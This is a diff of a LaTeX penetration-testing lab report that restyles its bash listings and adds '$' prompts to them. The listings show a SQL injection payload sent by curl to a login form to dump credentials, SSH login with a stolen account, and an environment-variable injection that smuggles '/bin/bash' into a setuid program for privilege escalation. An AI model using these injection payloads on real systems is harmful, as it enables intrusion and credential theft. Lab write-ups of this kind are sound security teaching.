@@ -60,9 +60,13 @@ top=    1 in
 
 % stile per comandi bash
 \lstdefinestyle{DOS}
-{ 
-    backgroundcolor=\color{black},
-    basicstyle=\color{white}\fontfamily{ttfamily}
+{
+  language=bash,
+  basicstyle=\color{black},
+    % backgroundcolor=\color{black},
+    % basicstyle=\color{white}\fontfamily{ttfamily},
+  showspaces=false,
+  showstringspaces=false,
 }
 \linespread{1}
 \onehalfspacing
@@ -92,7 +96,6 @@ Employee Network:
   \item TomPC: it represents the target host.
 \end{itemize} 
 Company Network: it connects all the employees to the company web service.
-
 
 
 \chapter{Footprinting}
@@ -181,21 +184,21 @@ In this case, the attacker Bob uses a mix of remote exploits to gain root access
 The attacker starts from the company web service by filling the login form with different combinations:
 
 \begin{lstlisting}[style=DOS]
-curl -X POST -d 'username=a&password=b' 193.20.3.1:8080
+$ curl -X POST -d 'username=a&password=b' 193.20.3.1:8080
 \end{lstlisting}
 In this case, the website uses an url-encoded form, so the attacker can send the data as an url-encoded string. This one returns "Error value(s) missing".
 \newline The attacker tries to tamper the form with another combination:
 \begin{lstlisting}[style=DOS]
-  curl -X POST -d 'username=&password=b' 193.20.3.1:8080
+$ curl -X POST -d 'username=&password=b' 193.20.3.1:8080
 \end{lstlisting}
 which returns:
 \begin{lstlisting}[style=DOS]
-  {"success":false,"response":"No user found","result":[]}
+$ {"success":false,"response":"No user found","result":[]}
 \end{lstlisting}
 Lastly, the attacker can try to insert a payload with a MySQL Injection, that uses OR and the commenting syntax:
 \begin{lstlisting}[style=DOS]
-  curl -X POST -d 'username=" OR 1<2; -- &password=b' \
-  193.20.3.1:8080
+$ curl -X POST -d 'username=" OR 1<2; -- &password=b' \
+$ 193.20.3.1:8080
 \end{lstlisting}
 which returns a list of credentials:
 \begin{center}
@@ -210,7 +213,7 @@ including an entry related to the user Tom:
 \section{SSH Access}
 Now, the attacker can access to the target machine which has an open SSH port:
 \begin{lstlisting}[style=DOS]
-  ssh tcasaccio1@193.20.1.3
+$ ssh tcasaccio1@193.20.1.3
 \end{lstlisting}
 
 \section{Privilege escalation}
@@ -248,7 +251,7 @@ payload by input. In this case, the workaround is the system call \textit{getenv
 variable specified as the function parameter. The attacker can modify the USER environment variable 
 by creating an \textit{environment variable injection}:
 \begin{lstlisting}[style=DOS]
-  export USER="; /bin/bash; echo ":tcasaccio1
+$ export USER="; /bin/bash; echo ":tcasaccio1
 \end{lstlisting}
 obtaining this behaviour by the program:
 \begin{center}
